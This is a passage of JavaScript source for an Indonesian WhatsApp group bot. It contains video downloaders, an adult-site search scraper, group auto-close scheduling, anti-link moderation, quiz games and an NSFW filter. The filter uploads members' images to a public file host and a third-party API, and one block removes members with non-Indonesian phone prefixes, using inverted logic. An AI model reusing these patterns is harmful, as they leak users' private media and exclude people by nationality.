            const mp3Options = searchResponse.data.links.mp3;
            const mediumQualityMp4Option = mp4Options[136]; 
            const mp3Option = mp3Options['mp3128']; 
            const mp4ConvertParams = new URLSearchParams();
            mp4ConvertParams.append('vid', videoId);
            mp4ConvertParams.append('k', mediumQualityMp4Option.k);
            const mp4ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp4ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp4ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP4.');
            }
            const mp4DownloadLink = mp4ConvertResponse.data.dlink;
            const mp3ConvertParams = new URLSearchParams();
            mp3ConvertParams.append('vid', videoId);
            mp3ConvertParams.append('k', mp3Option.k);
            const mp3ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp3ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp3ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP3.');
            }
            const mp3DownloadLink = mp3ConvertResponse.data.dlink;
            resolve({
                title: videoTitle,
                mp4DownloadLink,
                mp3DownloadLink
            });
        } catch (error) {
            reject('Error: ' + error.message);
        }
    });
 }
 //
// AUTO DOWNLOAD YOUTUBE SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const KhaerulZxvido = require('./lib/ytdl2')
const vido=await KhaerulZxvido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await KhaerulZx.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted:m})
}

// AUTO DOWNLOAD TIKTOK SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`tiktok.com`)){
reply('memuat..')
await Tiktok(budy).then(async resi => {
let taev = `Title : ${resi.title}
Author : ${resi.author}`
await KhaerulZx.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
await KhaerulZx.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
}

async function sendPoll(jid, text, list) {
KhaerulZx.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}    

async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function searchGif(query) {
  const url = `http://www.pornhub.com/gifs/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const gifs = $('ul.gifs.gifLink li');

    return gifs.map((i, gif) => {
      const data = $(gif).find('a');

      return {
        title: data.find('span').text(),
        url: 'http://dl.phncdn.com#id#.gif'.replace('#id#', data.attr('href')),
        webm: data.find('video').attr('data-webm'),
      };
    }).get();
}


//==================================================//
if (!KhaerulZx.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
KhaerulZx.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m KyyChat \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
//
//
/*
*<>AUTOCLOSEGC<>*
SOURCE: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
DON'T DELETE THIS WM!
HAPUS WM MANDUL 7 TURUNAN 
*BEBAS RECODE,ASAL INI WM JANGAN DIHAPUS ASU*
"aku janji tidak akan hapus wm ini"
RABU, 15 OKTOBER 2024 07:11
*/

const timeZone = 'Asia/Jakarta';
const closeTime = '00:00';
const openTime = '05:30';
const groupChats = [
    '120363214589220937@g.us',
    '120363297863341938@g.us'
];
let groupStatus = {};
let originalGroupNames = {};
let reminderSent = {};
const checkGroupsStatus = async () => {
    const currentTime = moment().tz(timeZone).format('HH:mm');
    for (const chatId of groupChats) {
        const groupMetadata = await KhaerulZx.groupMetadata(chatId);
        const currentGroupName = groupMetadata.subject;
        if (!originalGroupNames[chatId]) {
            originalGroupNames[chatId] = currentGroupName;
        }
        const closeReminderTime = moment(closeTime, 'HH:mm').subtract(5, 'minutes').format('HH:mm');
        const openReminderTime = moment(openTime, 'HH:mm').subtract(5, 'minutes').format('HH:mm');
        if (currentTime === closeReminderTime && !reminderSent[`${chatId}-close`]) {
            await KhaerulZx.sendMessage(chatId, { text: `𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡!!
<-> ɢʀᴏᴜᴘ ᴀᴋᴀɴ ᴛᴇʀᴛᴜᴛᴜᴘ 5 ᴍᴇɴɪᴛ ʟᴀɢɪ <->` });
            reminderSent[`${chatId}-close`] = true;
        }
        if (currentTime === openReminderTime && !reminderSent[`${chatId}-open`]) {
            await KhaerulZx.sendMessage(chatId, { text: `𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡!!
<-> ɢʀᴏᴜᴘ ᴀᴋᴀɴ ᴛᴇʀʙᴜᴋᴀ 5 ᴍᴇɴɪᴛ ʟᴀɢɪ <->` });
            reminderSent[`${chatId}-open`] = true;
        }
        if (currentTime === closeTime && groupStatus[chatId] !== 'closed') {
            await KhaerulZx.groupSettingUpdate(chatId, 'announcement');
            await KhaerulZx.groupUpdateSubject(chatId, `${originalGroupNames[chatId]} (𝗖𝗟𝗢𝗦𝗘)`);
            await KhaerulZx.sendMessage(chatId, { text: `( 𝗦𝗪𝗜𝗧𝗖𝗛 𝗠𝗢𝗗𝗘𝗦 ) ɢʀᴏᴜᴘ ᴛᴇʟᴀʜ ᴅɪᴛᴜᴛᴜᴘ, ᴅᴀɴ ᴀᴋᴀɴ ᴅɪʙᴜᴋᴀ ᴋᴇᴍʙᴀʟɪ ᴘᴀᴅᴀ ᴘᴜᴋᴜʟ 05.30 ᴡɪʙ` });
            groupStatus[chatId] = 'closed';
            reminderSent[`${chatId}-close`] = false;
        }
        if (currentTime === openTime && groupStatus[chatId] !== 'opened') {
            await KhaerulZx.groupSettingUpdate(chatId, 'not_announcement');
            await KhaerulZx.groupUpdateSubject(chatId, originalGroupNames[chatId]);
            await KhaerulZx.sendMessage(chatId, { text: `( 𝗦𝗪𝗜𝗧𝗖𝗛 𝗠𝗢𝗗𝗘𝗦 ) ɢʀᴏᴜᴘ ᴛᴇʟᴀʜ ᴅɪʙᴜᴋᴀ, ᴅᴀɴ ᴀᴋᴀɴ ᴅɪᴛᴜᴛᴜᴘ ᴋᴇᴍʙᴀʟɪ ᴘᴀᴅᴀ ᴘᴜᴋᴜʟ 00.00 ᴡɪʙ` });
            groupStatus[chatId] = 'opened';
            reminderSent[`${chatId}-open`] = false;
        }
    }
};
schedule.scheduleJob('* * * * *', () => {
    checkGroupsStatus();
});

           
//
if (AntiLink2) {
    if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!m.isGroup) return;
        if (!isBotAdmins) return reply(`${mess.botAdmin}, _Bot harus menjadi admin untuk dapat menendang anggota yang mengirim link grup_`);

        let gclink2 = (`https://chat.whatsapp.com/` + await KhaerulZx.groupInviteCode(m.chat));
        let isLinkThisGc2 = new RegExp(gclink2, 'i');
        let isgclink2 = isLinkThisGc2.test(m.text);

        if (isgclink2) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena link yang Anda kirim adalah link grup ini`});
        if (isAdmins) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin bebas memposting link apapun`});
        if (isCreator) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nOwner bebas memposting link apapun`});
        await KhaerulZx.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: mek.key.id,
                participant: mek.key.participant
            }
        });
        let users = m.sender;
        if (!warns[m.chat]) warns[m.chat] = {};
        if (!warns[m.chat][users]) warns[m.chat][users] = 0;

        warns[m.chat][users] += 1;

        const groupMetadata = await KhaerulZx.groupMetadata(m.chat);
        const groupName = groupMetadata.subject;

        if (warns[m.chat][users] < 3) {
            
            reply(`Anggota @${users.split('@')[0]} telah diberi peringatan. Total peringatan: ${warns[m.chat][users]}. Anggota akan dikeluarkan jika menerima 3 peringatan.`);
            await KhaerulZx.sendMessage(users, { text: `Anda telah menerima peringatan di grup *${groupName}*. Total peringatan Anda: ${warns[m.chat][users]}` });
        } else if (warns[m.chat][users] >= 3) {
            reply(`Anggota @${users.split('@')[0]} telah menerima 3 peringatan dan akan dikeluarkan dari group.`);
           /* await KhaerulZx.groupParticipantsUpdate(m.chat, [users], 'remove');*/
         /*   delete warns[m.chat][users]; */// Reset warn setelah dikeluarkan
            await KhaerulZx.sendMessage(users, { text: `Anda telah dikeluarkan dari grup *${groupName}* karena menerima 3 peringatan.` });
        }
        fs.writeFileSync('./database/warns.json', JSON.stringify(warns, null, 2));
    }
}

// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!m.isGroup) return;
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await KhaerulZx.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return KhaerulZx.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
}

 // Antiwame by geekz
if (AntiWame)
if (chath.match(/(wa.me\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by geekz


//antiasing by geekz
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isCreator) {
} else
await KhaerulZx.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz
if (AntiLinkYoutubeVid)
if (chath.match(/(youtu.be\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz
if (AntiLinkYoutubeChannel)
if (chath.match(/(youtube.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by geekz
if (AntiLinkInstagram)
if (chath.match(/(instagram.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz
if (AntiLinkFacebook)
if (chath.match(/(facebook.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz
if (AntiLinkTelegram)
if (chath.match(/(t.me\/)/gi)) {
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//petakbom
this.petakbom = this.petakbom ? this.petakbom : {}

let pilih2 = "🌀", bomb2 = "💣";

if (m.sender in this.petakbom) {
    if (!/^[1-9]$|^10$/i.test(body) || isCmd) return;
    
    const pos = parseInt(body) - 1;
    const gameData = this.petakbom[m.sender];
    const { petak, board2, pick2, nyawa2, bomb2, lolos2 } = gameData;

    if (petak[pos] === 1) return;  
    if (petak[pos] === 2) {
        gameData.board2[pos] = bomb2;
        gameData.pick2++;
        KhaerulZx.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        gameData.bomb2--;
        gameData.nyawa2.pop();

        if (gameData.nyawa2.length < 1) {
            await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n${board2.join("")}\n\n*Terpilih :* ${gameData.pick2}`);
            delete this.petakbom[m.sender];
        } else {
            await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n${board2.join("")}\n\nTerpilih: ${gameData.pick2}\nSisa nyawa: ${gameData.nyawa2.join("")}`);
        }
        return;
    }

    if (petak[pos] === 0) {
        gameData.petak[pos] = 1;
        gameData.board2[pos] = pilih2;
        gameData.pick2++;
        gameData.lolos2--;

        if (gameData.lolos2 < 1) {
            await m.reply(`*[ KAMU MENANG ]*\n\n${board2.join("")}\n\n*Terpilih :* ${gameData.pick2}\n*Sisa nyawa :* ${gameData.nyawa2.join("")}\n*Bomb :* ${gameData.bomb2}`);
            userdb.petakbom = false
            KhaerulZx.sendMessage(m.chat, { react: { text: '🟢', key: m.key } });
            delete this.petakbom[m.sender];
        } else {
            await m.reply(`*PILIH ANGKA*\n\n${board2.join("")}\n\nTerpilih : ${gameData.pick2}\nSisa nyawa : ${gameData.nyawa2.join("")}\nBomb : ${gameData.bomb2}`);
        }
        return;
    }
}
	// Tebak Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				tebakbom[m.sender].pick++;
				KhaerulZx.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				tebakbom[m.sender].bomb--;
				tebakbom[m.sender].nyawa.pop();
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].nyawa.length < 1) {
					db.data.users[sender].limit -= 3
					await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n_Pengurangan Limit : 2_`);
					KhaerulZx.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete tebakbom[m.sender];
				} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join('')}\n\nTerpilih: ${tebakbom[m.sender].pick}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				tebakbom[m.sender].pick++;
				tebakbom[m.sender].lolos--;
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].lolos < 1) {
					db.data.users[m.sender].limit += 20
					await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n*Sisa nyawa :* ${tebakbom[m.sender].nyawa}\n*Bomb :* ${tebakbom[m.sender].bomb}\n*Hadiah :* limit 20`);
					delete tebakbom[m.sender];
				} else m.reply(`*PILIH ANGKA*\n\n${brd.join('')}\n\nTerpilih : ${tebakbom[m.sender].pick}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${tebakbom[m.sender].bomb}`)
			}
		}
		
		//
KhaerulZx.family100 = KhaerulZx.family100 ? KhaerulZx.family100 : {};
if (from in KhaerulZx.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.data.users[m.sender];
    let room = KhaerulZx.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);
    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);
        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return reply('Dikit lagi!');
            }
        }
        if (!isCmd && room.terjawab[index]) {
            return;
        }
        users.limit += room.winScore;
        room.terjawab[index] = m.sender;
    }
    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;
    let caption = `*GAME FAMILY100*
*Soal:* ${room.soal}
Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}
${isSurrender ? '' : `+${room.winScore} Limit tiap jawaban benar`}
    `.trim();
    KhaerulZx.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        KhaerulZx.family100[id].msg = msg;
    }).catch(_ => _);
    if (isWin || isSurrender) {
        delete KhaerulZx.family100[id];
    }
}
//

if (blacklist[m.sender]) {  KhaerulZx.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.id,
            participant: m.sender
        }
    });
    return;
}
//// GAME TEBAK LAGU BY DARWIN
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply(`*JAWABAN BENAR*\n\n*Penebak :* @${m?.sender.split('@')[0]}\n*Jawaban :* ${jawaban}\n*Hadiah Limit :* 15`);
db.data.users[m.sender].limit += 15
KhaerulZx.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else KhaerulZx.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
// GAME TEBAK BENDERA BY DARWIN
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply(`*JAWABAN BENAR*\n\n*Penebak :* @${m?.sender.split('@')[0]}\n*Jawaban :* ${jawaban}\n*Hadiah : 15 limit`);
db.data.users[m.sender].limit += 15
KhaerulZx.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else KhaerulZx.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

			//
		KhaerulZx.tebakkata = KhaerulZx.tebakkata ? KhaerulZx.tebakkata : {}  
if (from in KhaerulZx.tebakkata) {
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(KhaerulZx.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 db.data.users[m.sender].limit += 15
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban @${m?.sender.split('@')[0]} Benar 🎉\nHadiah : 15 limit\n`
 reply(`${teks}`)
 clearTimeout(KhaerulZx.tebakkata[id][2])
 delete KhaerulZx.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
//antilink tiktok by geekz
if (AntiLinkTiktok)
if (chath.match(/(tiktok.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz
if (AntiLinkTwitter)
if (chath.match(/(twitter.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

// AUTO CONVERT IMAGE/VIDEO BY Finsii AI
if (viewOnceMediaGroup[m.chat] && m.isGroup && !isAdmins) {
    if (/image|video/.test(m.mtype)) {
        try {
            let mediaUrl = await KhaerulZx.downloadAndSaveMediaMessage(m);
            if (!mediaUrl) {
                return reply('Terjadi kesalahan saat mengunduh media.');
            }
            let mediaType = /image/.test(m.mtype) ? 'image' : 'video';
            let previousCaption = m.text || ' ';
            let pushname = m.pushName || m.sender.split('@')[0];
            let mentionedJid = m.message.extendedTextMessage 
                ? m.message.extendedTextMessage.contextInfo.mentionedJid || [] 
                : [];
            await KhaerulZx.sendMessage(from, {
                [mediaType]: { url: mediaUrl },
                caption: `Media dari ${pushname}\n\nCaption: ${previousCaption}`,
                viewOnce: true,
                mentions: mentionedJid
            });
            await KhaerulZx.sendMessage(from, { delete: { remoteJid: from, id: m.id, fromMe: m.fromMe, participant: m.sender }});
            
            let notifyMessage = `Media dari @${pushname} telah dihapus, dan telah diubah menjadi sekali lihat oleh bot.`;
            await KhaerulZx.sendMessage(from, { text: notifyMessage, mentions: [m.sender] });

        } catch (error) {
            console.error('Error processing media:', error);
            reply('Terjadi kesalahan saat memproses media.');
        }
    }
}
async function uploadToCatbox(filePath) {
    const form = new FormData();
    form.append('fileToUpload', fs.createReadStream(filePath));
    form.append('reqtype', 'fileupload');
  
    try {
        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        if (response.data) {
            const filename = response.data.trim();
            return `https://files.catbox.moe/${filename}`;
        } else {
            throw new Error('Gagal mendapatkan URL dari Catbox.');
        }
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw error;
    }
}

async function photoleap(prompt) {
    try {
        let result = [];
        for (let i = 0; i < 3; i++) {
            let { data } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url);
        }
        return result;
    } catch (e) {
        return { msg: 404 };
    }
}

//

if (antiNsfwGroup[m.chat] && m.isGroup && !isAdmins) {
    if (m.mtype === 'imageMessage' || m.mtype === 'videoMessage') {
        const filePath = await KhaerulZx.downloadMediaMessage(m);
        try {
            const mediaUrl = await uploadToCatbox(filePath);
            let nsfwCheckUrl = `https://api-zenith.koyeb.app/api/detect/porno?url=${mediaUrl}&apikey=zenkey`;
            let response = await axios.get(nsfwCheckUrl);
            let result = response.data;
            if (result.is_porn) {
                await KhaerulZx.sendMessage(from, { delete: { remoteJid: from, id: m.id, fromMe: m.fromMe, participant: m.sender }});
                reply(`Konten NSFW terdeteksi dan telah dihapus dari grup!`);
            }
        } catch (error) {
            console.error('Error detecting NSFW content:', error);
